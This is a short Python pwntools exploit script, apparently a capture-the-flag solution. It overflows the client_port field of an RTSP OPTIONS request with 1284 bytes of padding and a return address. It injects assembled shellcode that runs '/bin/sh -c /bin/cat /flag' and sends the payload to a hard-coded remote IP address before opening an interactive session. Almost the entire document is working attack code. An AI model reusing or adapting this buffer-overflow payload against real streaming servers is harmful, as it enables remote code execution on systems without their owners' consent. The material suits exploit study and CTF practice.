from pwn import *
import os

shellcode_base = 0x13f510 + 1352

path = "/bin/sh\x00sh\x00-c\x00/bin/cat /flag >&4 2>&4\x00"
argv = flat([
    shellcode_base + 0x1000 + len('/bin/sh\x00'),
    shellcode_base + 0x1000 + len('/bin/sh\x00sh\x00'),
    shellcode_base + 0x1000 + len('/bin/sh\x00sh\x00-c\x00'),
    0,
])
envp = ""
e = path.ljust(0x1000, "\x00") + argv.ljust(0x1000, "\x00") + envp.ljust(0x1000, "\x00")

os.system("~/as-new shellcode.S")
os.system("objcopy -I elf32-little --dump-section .text=shellcode.bin a.out")
shellcode = file("shellcode.bin", "rb").read()
shellcode = shellcode.ljust(0x1000, "/") + e

rop = flat([
    "A"*1284,
    # pc
    shellcode_base,
]).rstrip("\x00")
assert("\x00" not in rop)

payload = """OPTIONS\r
rtsp://localhost:8554/mjpeg/1\r
client_port={}\r
CSeq: 1\r
\r
""".format(rop) + shellcode
print payload.index(rop)
print len(payload)

r = remote("47.242.246.203", 37012)
#r = remote("localhost", 8554)
r.send(payload + "\r\n\r\n")
time.sleep(0.5)
#pause()

r.interactive()
